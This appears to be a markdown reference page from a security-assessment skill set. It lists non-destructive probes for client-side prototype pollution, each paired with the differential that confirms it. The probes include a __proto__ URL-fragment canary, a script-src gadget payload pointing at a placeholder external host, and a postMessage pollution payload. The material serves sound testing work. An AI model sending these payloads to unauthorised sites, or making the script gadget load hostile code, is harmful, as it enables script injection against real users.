# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`prototype-pollution-client-side-gadgets`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `prototype-pollution-client-side-gadgets`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Hash-source canary

**Expected differential:** a fresh object reports cg_canary after the fragment loads, and does not for a benign fragment

```text
#__proto__[cg_canary]=polluted
```

### Loader-gadget probe

**Expected differential:** a created script element gains a src default from the polluted prototype, inert and assessor-controlled

```text
#__proto__[src]=//<assessor-controlled-host>/inert.js
```

### postMessage source

**Expected differential:** a postMessage payload pollutes config when the handler merges event data without a guard

```text
postMessage {"__proto__":{"cg_canary":"polluted"}}
```

### Console confirmation

**Expected differential:** a fresh object literal carries the canary, confirming prototype mutation in the live runtime

```text
check ({}).cg_canary in the DevTools console
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
